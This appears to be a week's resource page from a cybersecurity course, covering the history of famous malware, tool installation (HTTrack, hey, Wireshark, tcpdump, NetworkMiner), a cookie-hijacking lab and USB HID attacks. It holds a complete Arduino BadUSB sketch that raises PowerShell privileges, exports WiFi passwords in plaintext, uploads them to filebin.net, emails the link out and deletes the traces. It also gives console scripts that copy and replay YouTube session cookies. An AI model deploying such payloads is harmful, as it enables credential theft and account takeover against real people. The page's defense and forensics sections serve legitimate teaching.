# Week 02 - Cybersecurity Course Resources

## Table of Contents
- [Security Vulnerabilities & Exploits](#security-vulnerabilities--exploits)
- [Famous Cyber Attacks](#famous-cyber-attacks---historical-analysis)
- [Penetration Testing Tools](#penetration-testing-tools)
- [DDoS Attack Testing](#ddos-attack-testing)
- [Network Traffic Analysis](#network-traffic-analysis--session-hijacking)
- [Session Hijacking](#session-hijacking---cookie-theft--replay)
- [Hardware-Based Attacks](#hardware-based-attacks---usb-rubber-ducky--badusb)
- [Ethical & Legal Disclaimer](#ethical--legal-disclaimer)
- [Additional Resources](#additional-resources)

---

## 🔴 Security Vulnerabilities & Exploits

### Interactive Security Learning
- **[Hacksplaining - Security Lessons](https://hacksplaining.com/lessons)**
  - Interactive tutorials on common security vulnerabilities
  - Learn about SQL injection, XSS, CSRF, and more
  - Hands-on exercises to understand how attacks work
  - Best for: Understanding attack vectors through practice

### Related Learning Resources:
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free online training with labs
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most critical web application security risks
- [PentesterLab](https://pentesterlab.com/) - Hands-on penetration testing exercises
- [HackTheBox](https://www.hackthebox.com/) - Cybersecurity training platform with challenges

---

## 🔴 Famous Cyber Attacks - Historical Analysis

### Video Resource
- **[YouTube: Major Cyber Attacks Explained](https://www.youtube.com/watch?v=VJFaO2-zsCU)**
  - Visual breakdown of historical cyber incidents
  - Understanding attack methodologies and impact

### Malware Types & Notable Examples

| Type | Example | Creator/Country | Year | Protocol Exploited | Exploit Used | How It Works | Impact | Motive |
|------|---------|----------------|------|-------------------|--------------|--------------|--------|--------|
| **Malware (general)** | **Stuxnet** | USA + Israel (alleged) | ~2010 | USB, Windows RPC, PLC | Zero-days + Siemens PLC manipulation | Spread via USB → infected Windows → altered centrifuge speeds while showing normal readings | Damaged Iran's nuclear centrifuges | Cyber-sabotage of nuclear program |
| **Virus** | **ILOVEYOU** | Philippines (Onel de Guzman) | 2000 | Email (SMTP) | VBS script as fake text file | Opens email attachment → overwrites files → self-replicates to contacts | ~45 million computers infected | Financial theft & disruption experiment |
| **Worm** | **WannaCry** | North Korea (linked) | 2017 | **SMBv1 (Port 445)** | **EternalBlue** (SMB buffer overflow) | Auto-scans unpatched Windows machines, no user interaction needed | Hospitals, companies, governments worldwide | Ransomware revenue for NK regime |
| **Trojan** | **Zeus** | Russian cybercrime groups | 2007 | HTTP/HTTPS | Social engineering via fake bank forms | User installs Trojan → steals banking credentials → sends to C&C servers | Millions stolen from online banking | Financial theft |
| **Ransomware** | **LockBit** | Unknown (global group) | 2019 | RDP, SMB, HTTP, phishing | Brute-force RDP, VPN exploits, phishing | Encrypts files → exfiltrates data → demands ransom with timer | Major corporate/government shutdowns | Extortion for profit |
| **Spyware** | **Pegasus** | NSO Group (Israel) | 2016 | iMessage, WhatsApp, Safari | Zero-click exploits (FORCEDENTRY) | Silent infection → extracts messages, calls, video, GPS in real-time | Journalists, activists, politicians targeted | Government surveillance/intelligence |

### Additional Attack Case Studies:
- [Mirai Botnet (2016)](https://www.cloudflare.com/learning/ddos/glossary/mirai-botnet/) - IoT device DDoS attack
- [SolarWinds Supply Chain Attack (2020)](https://www.cisa.gov/news-events/news/what-happened-solarwinds-supply-chain-attack) - Nation-state espionage
- [Colonial Pipeline Ransomware (2021)](https://www.cisa.gov/news-events/news/colonial-pipeline-cyber-incident) - Critical infrastructure attack
- [Equifax Data Breach (2017)](https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement) - 147M records compromised

---

## 🔴 Penetration Testing Tools

### Hacking Toolkit Collection
- **[CodingRanjith's Hacking Toolkit](https://github.com/CodingRanjith/hackingtoolkit)**
  - Curated collection of ethical hacking tools
  - Scripts for reconnaissance, exploitation, and post-exploitation
  - **⚠️ LEGAL WARNING:** Use only on systems you own or have explicit permission to test

### Website Cloning & Archiving - HTTrack

- **[HTTrack - Website Copier](https://www.httrack.com/)**
  - Cross-platform website mirroring tool
  - Downloads entire websites for offline browsing
  - Useful for: Security research, archiving, offline analysis

#### **Installation Instructions**

**Windows:**
```powershell
# Method 1: Download installer from official website
# Visit: https://www.httrack.com/page/2/en/index.html
# Download WinHTTrack installer and run setup

# Method 2: Using Chocolatey package manager
choco install httrack

# Method 3: Using Scoop
scoop install httrack
```

**macOS:**
```bash
# Using Homebrew
brew install httrack

# Verify installation
httrack --version
```

**Linux (Debian/Ubuntu):**
```bash
# Update package list
sudo apt update

# Install HTTrack
sudo apt install httrack

# Verify installation
httrack --version
```

**Linux (RHEL/CentOS/Fedora):**
```bash
# Install HTTrack
sudo dnf install httrack

# For older CentOS versions
sudo yum install httrack
```

**Linux (Arch):**
```bash
# Install from AUR
yay -S httrack

# Or using pamac
pamac install httrack
```

**Kali Linux:**
```bash
# HTTrack comes pre-installed, but to update:
sudo apt update && sudo apt install httrack
```

#### **Basic Usage Examples**

**Simple Website Clone (All Platforms):**
```bash
# Clone a single website
httrack "https://example.com" -O "/path/to/output"

# Windows example
httrack "https://example.com" -O "C:\WebMirror\example"

# macOS/Linux example
httrack "https://example.com" -O "~/WebMirror/example"
```

**Advanced HTTrack Commands:**

```bash
# Clone with recursion depth limit (3 levels deep)
httrack "https://example.com" -O "/output" -r3

# Clone only specific file types
httrack "https://example.com" -O "/output" +*.html +*.css +*.js +*.png +*.jpg

# Exclude certain directories
httrack "https://example.com" -O "/output" -*.example.com/admin/* -*.example.com/private/*

# Mirror with external links from same domain
httrack "https://example.com" -O "/output" "+*.example.com/*" "+*.cdn.example.com/*"

# Set download speed limit (useful to avoid detection)
httrack "https://example.com" -O "/output" -%k1000

# Clone with custom user agent
httrack "https://example.com" -O "/output" -F "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Resume interrupted download
httrack --continue

# Update existing mirror
httrack --update

# Clone with bandwidth throttling (bytes per second)
httrack "https://example.com" -O "/output" -A50000
```

#### **HTTrack Parameters Reference**

| Parameter | Description | Example |
|-----------|-------------|---------|
| `-O` | Output directory | `-O "/path/to/folder"` |
| `-r` | Recursion depth | `-r5` (5 levels) |
| `+pattern` | Include files matching pattern | `+*.example.com/*` |
| `-pattern` | Exclude files matching pattern | `-*.example.com/admin/*` |
| `-%k` | Connection speed limit (KB/s) | `-%k500` |
| `-F` | User-Agent string | `-F "Custom User Agent"` |
| `-A` | Bandwidth limit (bytes/s) | `-A100000` |
| `-c` | Number of connections | `-c8` |
| `-%v` | Verbose mode | `-%v` |
| `-q` | Quiet mode | `-q` |
| `--continue` | Resume download | `--continue` |
| `--update` | Update existing mirror | `--update` |

### Alternative Tools:

**Wget (Cross-Platform):**
```bash
# Windows (install via Git Bash or WSL)
# macOS: brew install wget
# Linux: sudo apt install wget

# Mirror entire website
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://example.com

# Short form
wget -mkEpnp https://example.com
```

---

## 🔴 DDoS Attack Testing (Controlled Environment Only)

### Understanding DDoS Attacks
- **[CyberScoop: X DDoS Attack Analysis](https://cyberscoop.com/x-ddos-attack-researchers-elon-musk-dark-storm/)**
  - Real-world DDoS incident case study
  - Analysis of Dark Storm Team attack methods

### HTTP Load Testing Tool - Hey

- **[Hey - HTTP Load Generator](https://github.com/rakyll/hey)**
  - Modern replacement for Apache Bench
  - **⚠️ CRITICAL:** Only test systems you own or have written permission to test

#### **Installation Instructions**

**Windows:**
```powershell
# Method 1: Download from releases
# Visit: https://github.com/rakyll/hey/releases
# Download hey_windows_amd64.exe

# Method 2: Using Scoop
scoop install hey

# Method 3: Using Chocolatey
choco install hey

# Method 4: Using Go
go install github.com/rakyll/hey@latest
```

**macOS:**
```bash
# Using Homebrew (recommended)
brew install hey

# Using Go
go install github.com/rakyll/hey@latest

# Verify installation
hey -version
```

**Linux (Debian/Ubuntu):**
```bash
# Using Go
sudo apt update
sudo apt install golang-go
go install github.com/rakyll/hey@latest

# Add to PATH
echo 'export PATH="$PATH:$(go env GOPATH)/bin"' >> ~/.bashrc
source ~/.bashrc

# Verify
hey -version
```

#### **Usage Examples**

```bash
# Basic test: 10,000 requests with 200 concurrent connections
# ⚠️ ONLY USE ON LOCALHOST OR YOUR OWN SYSTEMS
hey -n 10000 -c 200 http://localhost:8080

# Test with duration (30 seconds)
hey -z 30s -c 50 http://localhost:8080

# POST request with JSON
hey -n 1000 -c 50 -m POST \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}' \
  http://localhost:8080/api/login

# Rate limiting: 100 requests per second
hey -n 5000 -q 100 http://localhost:8080

# HTTP/2 testing
hey -n 1000 -c 10 -h2 https://localhost:8443
```

#### **Hey Parameters Reference**

| Parameter | Description | Example |
|-----------|-------------|---------|
| `-n` | Total number of requests | `-n 10000` |
| `-c` | Number of concurrent workers | `-c 200` |
| `-q` | Rate limit (requests/sec) | `-q 100` |
| `-z` | Duration of test | `-z 30s`, `-z 5m` |
| `-m` | HTTP method | `-m POST` |
| `-H` | Custom header | `-H "Auth: token"` |
| `-d` | Request body | `-d '{"key":"value"}'` |
| `-t` | Timeout (seconds) | `-t 20` |
| `-h2` | Enable HTTP/2 | `-h2` |

---

## 🔴 Network Traffic Analysis & Session Hijacking

### Traffic Capture & Analysis - NetworkMiner

- **[NetworkMiner](https://www.netresec.com/?page=NetworkMiner)**
  - Passive network forensics tool
  - Extracts files, credentials, sessions from PCAP files

#### **Installation**

**Windows:**
```powershell
# Download from: https://www.netresec.com/?page=NetworkMiner
# Extract ZIP and run NetworkMiner.exe
```

**Linux (Ubuntu/Debian):**
```bash
# Install Mono
sudo apt update
sudo apt install mono-complete

# Download NetworkMiner
wget https://www.netresec.com/files/NetworkMiner_2-8-1.zip
unzip NetworkMiner_2-8-1.zip
cd NetworkMiner_2-8-1/

# Run
sudo mono NetworkMiner.exe
```

**macOS:**
```bash
# Install Mono
brew install mono

# Download and extract NetworkMiner
curl -O https://www.netresec.com/files/NetworkMiner_2-8-1.zip
unzip NetworkMiner_2-8-1.zip
cd NetworkMiner_2-8-1/

# Run
sudo mono NetworkMiner.exe
```

**Kali Linux:**
```bash
# Pre-installed
sudo networkminer
```

### Wireshark Installation

**Windows:**
```powershell
# Download from: https://www.wireshark.org/download.html
# Or using Chocolatey
choco install wireshark
```

**macOS:**
```bash
brew install --cask wireshark
```

**Linux (Debian/Ubuntu):**
```bash
sudo apt update
sudo apt install wireshark

# Add user to wireshark group
sudo usermod -aG wireshark $USER
sudo dpkg-reconfigure wireshark-common
```

**Wireshark Commands:**
```bash
# Capture on interface
wireshark -i eth0 -k

# Save to file
wireshark -i eth0 -k -w capture.pcap

# Command-line (tshark)
tshark -i eth0 -w capture.pcap

# Capture HTTP only
tshark -i eth0 -Y "http"
```

### tcpdump Commands

```bash
# List interfaces
tcpdump -D

# Capture and save
sudo tcpdump -i eth0 -w capture.pcap

# Capture HTTP
sudo tcpdump -i eth0 'tcp port 80'

# Capture DNS
sudo tcpdump -i eth0 'udp port 53'

# Filter by IP
sudo tcpdump -i eth0 src 192.168.1.100

# Read PCAP
tcpdump -r capture.pcap
```

---

## 🔴 Session Hijacking - Cookie Theft & Replay

### Browser Cookie Manipulation

- **[Cookie-Editor (Chrome Extension)](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm)**

### 🔴 Cookie Hijacking Lab - YouTube Session Transfer

#### **Method 1: Cookie-Editor (Fastest)**

**On Source Computer:**
1. Install Cookie-Editor extension
2. Go to `https://youtube.com`
3. Click Cookie-Editor → **"Export"** → **"Export as JSON"**
4. Save file

**On Target Computer:**
1. Install same browser + Cookie-Editor
2. Go to `https://youtube.com`
3. Cookie-Editor → **"Import"** → Paste content
4. Hard refresh: `Ctrl + F5` (Windows/Linux) or `Cmd + Shift + R` (macOS)

#### **Method 2: DevTools (Manual)**

**Chrome/Edge/Brave:**

**On Source Computer:**
```javascript
// Press F12 → Console
(function() {
    const cookies = document.cookie.split(';');
    const cookieData = {};
    cookies.forEach(cookie => {
        const [name, value] = cookie.split('=');
        cookieData[name.trim()] = value;
    });
    console.log(JSON.stringify(cookieData, null, 2));
    copy(JSON.stringify(cookieData, null, 2));
})();
```

**On Target Computer:**
```javascript
// Navigate to youtube.com, Press F12 → Console
const cookies = {
    "SID": "value_here",
    "HSID": "value_here",
    "SSID": "value_here",
    "__Secure-1PSID": "value_here"
};

for (const [name, value] of Object.entries(cookies)) {
    document.cookie = `${name}=${value}; domain=.youtube.com; path=/; secure`;
}
// Refresh page
```

### Defense Mechanisms

**For Developers:**
```javascript
// Node.js - Secure cookies
res.cookie('sessionId', 'abc123', {
    httpOnly: true,      // No JavaScript access
    secure: true,        // HTTPS only
    sameSite: 'strict'   // CSRF protection
});
```

**For Users:**
- Lock computer when away (Win+L / Cmd+Ctrl+Q)
- Enable 2FA
- Use HTTPS Everywhere
- Clear cookies regularly

---

## 🔴 Hardware-Based Attacks - USB Rubber Ducky & BadUSB

### 🔴 Arduino USB Attack - WiFi Password Exfiltration

#### **Hardware Required:**
- Arduino Leonardo or Pro Micro (ATmega32U4 chip)
- USB cable
- **Why ATmega32U4?** Native USB HID support (acts as keyboard)

#### **Setup Gmail App Password**

1. Go to [Google Account Security](https://myaccount.google.com/security)
2. Enable **2-Step Verification**
3. Go to **App Passwords**: https://myaccount.google.com/apppasswords
4. Generate password for "Mail"
5. Copy 16-character password (remove spaces)
6. Use in Arduino code

#### **Complete Arduino Code**

```cpp
#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(2000);
  
  // === STAGE 1: Open Admin PowerShell ===
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(600);
  
  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3500);
  
  // Navigate UAC
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  
  // === STAGE 2: Export WiFi ===
  Keyboard.println("New-Item -ItemType Directory -Path C:\\WiFiBackup -Force | Out-Null");
  delay(1000);
  
  Keyboard.println("netsh wlan export profile key=clear folder=C:\\WiFiBackup | Out-Null");
  delay(5000);
  
  Keyboard.println("Compress-Archive -Path C:\\WiFiBackup -DestinationPath C:\\WiFiBackup.zip -Force");
  delay(4000);
  
  // === STAGE 3: Upload to Filebin ===
  Keyboard.println("$response = curl.exe --data-binary @C:\\WiFiBackup.zip -H \"filename: WiFiBackup.zip\" https://filebin.net");
  delay(6000);
  
  Keyboard.println("$json = $response | ConvertFrom-Json");
  Keyboard.println("$link = \"https://filebin.net/$($json.bin.id)/$($json.file.filename)\"");
  
  // === STAGE 4: Email Link ===
  // ⚠️ REPLACE WITH YOUR CREDENTIALS
  Keyboard.println("$P = ConvertTo-SecureString 'YOUR_APP_PASSWORD_HERE' -AsPlainText -Force");
  delay(500);
  
  Keyboard.println("$C = New-Object System.Management.Automation.PSCredential 'your-email@gmail.com', $P");
  delay(500);
  
  Keyboard.println("Send-MailMessage -From 'your-email@gmail.com' -To 'your-email@gmail.com' -Subject 'WiFi Passwords Ready' -Body \"Download: $link\" -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $C");
  delay(8000);
  
  // === STAGE 5: Save Locally ===
  Keyboard.println("$link | Out-File -FilePath \"$env:USERPROFILE\\Desktop\\WiFi_Link.txt\" -Encoding ASCII");
  Keyboard.println("$link | clip");
  
  // === STAGE 6: Cleanup ===
  Keyboard.println("notepad \"$env:USERPROFILE\\Desktop\\WiFi_Link.txt\"");
  delay(1500);
  Keyboard.println("Start-Process $link");
  Keyboard.println("Remove-Item -Recurse -Force C:\\WiFiBackup -ErrorAction SilentlyContinue");
  Keyboard.println("Remove-Item -Force C:\\WiFiBackup.zip -ErrorAction SilentlyContinue");
  Keyboard.println("Write-Host 'SENT TO YOUR EMAIL! Check Gmail.' -ForegroundColor Green");
  
  Keyboard.end();
}

void loop() {
  // Empty
}
```

#### **Arduino IDE Setup**

**Install Arduino IDE:**

**Windows:**
```powershell
# Download from: https://www.arduino.cc/en/software
# Or
choco install arduino
```

**macOS:**
```bash
brew install --cask arduino
```

**Linux:**
```bash
# Debian/Ubuntu
sudo apt install arduino

# Or download AppImage
wget https://downloads.arduino.cc/arduino-ide/arduino-ide_2.2.1_Linux_64bit.AppImage
chmod +x arduino-ide_2.2.1_Linux_64bit.AppImage
./arduino-ide_2.2.1_Linux_64bit.AppImage
```

**Upload Code:**
1. Open Arduino IDE
2. Select Board: **Tools → Board → Arduino Leonardo**
3. Select Port: **Tools → Port → COM[X]** (Windows) or **/dev/ttyACM0** (Linux)
4. Paste code
5. Click **Upload** (arrow icon)
6. Wait for "Done uploading"

#### **How It Works**

**Stage 1: Privilege Escalation**
```powershell
# Opens PowerShell as admin
powershell Start-Process powershell -Verb runAs
```

**Stage 2: Data Exfiltration**
```powershell
# Exports WiFi passwords in plaintext
netsh wlan export profile key=clear folder=C:\WiFiBackup
```

**Stage 3: Anonymous Upload**
- Filebin.net: Free anonymous file hosting
- Returns JSON with download URL

**Stage 4: Email Notification**
- Gmail SMTP with TLS
- Requires app-specific password
- Attacker receives link remotely

**Stage 5: Anti-Forensics**
```powershell
# Removes all traces
Remove-Item -Recurse -Force C:\WiFiBackup
Remove-Item -Force C:\WiFiBackup.zip
```

### Defense Mechanisms

**For Organizations:**

**1. USB Port Blocking (Group Policy)**
```
Computer Configuration → Administrative Templates → System → Removable Storage Access
Enable: "All Removable Storage classes: Deny all access"
```

**2. Registry Method (Windows)**
```powershell
# Disable USB storage
reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f
```

**3. Linux (udev rules)**
```bash
# Create: /etc/udev/rules.d/10-usb-block.rules
ACTION=="add", SUBSYSTEMS=="usb", SUBSYSTEM=="block", RUN+="/bin/sh -c 'echo 0 > /sys/$devpath/authorized'"
```

**4. PowerShell Logging**
```powershell
# Enable script block logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f

# View logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104}
```

**For Individuals:**
- Lock computer: **Win+L** (Windows) / **Cmd+Ctrl+Q** (macOS) / **Super+L** (Linux)
- Enable BitLocker/FileVault/LUKS encryption
- Use USB data blockers ("USB condoms")
- Never plug unknown USB devices

### Commercial USB Attack Tools

**1. USB Rubber Ducky ($80)**
- [Hak5 Store](https://shop.hak5.org/products/usb-rubber-ducky)
- DuckyScript language
- Faster execution than Arduino

**2. Bash Bunny ($120)**
- Multi-protocol (HID, Ethernet, Serial)
- Visual feedback LEDs
- Payload switching

**3. O.MG Cable ($180)**
- Looks like normal USB cable
- WiFi-controlled
- Remote payload execution

**4. Digispark ATtiny85 ($2-5)**
- Cheapest option
- Tiny form factor
- Compatible with Arduino IDE

### Detection & Forensics

**Check PowerShell History:**
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
```

**Check Recent Files:**
```powershell
Get-ChildItem C:\ -Recurse | Where-Object {$_.CreationTime -gt (Get-Date).AddHours(-1)}
```

**Check Network Connections:**
```powershell
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}
```

**Check Event Logs:**
```powershell
# PowerShell execution
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104}

# USB devices
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-DriverFrameworks-UserMode/Operational'; ID=2003}
```

---

## 🔴 Ethical & Legal Disclaimer

> **CRITICAL WARNING:** All techniques are for **EDUCATIONAL PURPOSES ONLY**.
> 
> **Illegal Activities:**
> - Unauthorized access to computer systems
> - Network traffic interception without permission
> - DDoS attacks against systems you don't own
> - Session hijacking of real accounts
> - USB attacks on systems without authorization
> - WiFi password theft from networks you don't control
> 
> **Legal Use Cases:**
> - ✅ Your own devices and networks
> - ✅ Lab environments for learning
> - ✅ Systems with **written authorization**
> - ✅ Bug bounty programs
> - ✅ Controlled security training
> 
> **Consequences:**
> - **CFAA (USA)**: Up to 20 years imprisonment
> - **Computer Misuse Act (UK)**: Up to 10 years
> - Substantial fines ($100,000+)
> - Permanent criminal record
> - Civil lawsuits
> - Industry ban
> 
> **Always obtain explicit written permission before testing any system you do not own.**

---

## 🔴 Additional Resources

### Cybersecurity News
- [Krebs on Security](https://krebsonsecurity.com/)
- [The Hacker News](https://thehackernews.com/)
- [Bleeping Computer](https://www.bleepingcomputer.com/)
- [Dark Reading](https://www.darkreading.com/)

### Vulnerability Databases
- [CVE Details](https://www.cvedetails.com/)
- [Exploit Database](https://www.exploit-db.com/)
- [National Vulnerability Database](https://nvd.nist.gov/)
- [MITRE ATT&CK](https://attack.mitre.org/)

### Practice Environments
- [TryHackMe](https://tryhackme.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [VulnHub](https://www.vulnhub.com/)
- [PicoCTF](https://picoctf.org/)
- [OverTheWire](https://overthewire.org/wargames/)

### Tools & Frameworks
- [Kali Linux](https://www.kali.org/)
- [Metasploit](https://www.metasploit.com/)
- [Burp Suite](https://portswigger.net/burp)
- [Nmap](https://nmap.org/)
- [Wireshark](https://www.wireshark.org/)

### Certifications
- [CompTIA Security+](https://www.comptia.org/certifications/security)
- [CEH](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/)
- [OSCP](https://www.offensive-security.com/pwk-oscp/)
- [CISSP](https://www.isc2.org/Certifications/CISSP)

### Books
- "The Web Application Hacker's Handbook"
- "Metasploit: The Penetration Tester's Guide"
- "The Hacker Playbook Series"
- "Black Hat Python"

---

## 🔴 Week 02 Summary

**Topics Covered:**
1. Security vulnerabilities and interactive learning
2. Historical cyber attacks and malware analysis
3. HTTrack website mirroring (Windows/macOS/Linux)
4. Hey load testing tool (Windows/macOS/Linux)
5. NetworkMiner traffic analysis (Windows/macOS/Linux)
6. Wireshark and tcpdump packet capture
7. Cookie hijacking and session replay
8. Arduino USB HID attacks and WiFi exfiltration
9. Defense mechanisms and forensics

**Key Takeaways:**
- Always obtain written permission
- Practice in controlled environments only
- Understand legal implications
- Implement defense-in-depth
- Stay updated on threats

---

**Next Week:** Week 03 - Cryptography & Secure Communications

---

**Document Version:** 2.0  
**Last Updated:** November 2024  
**License:** Educational Use Only
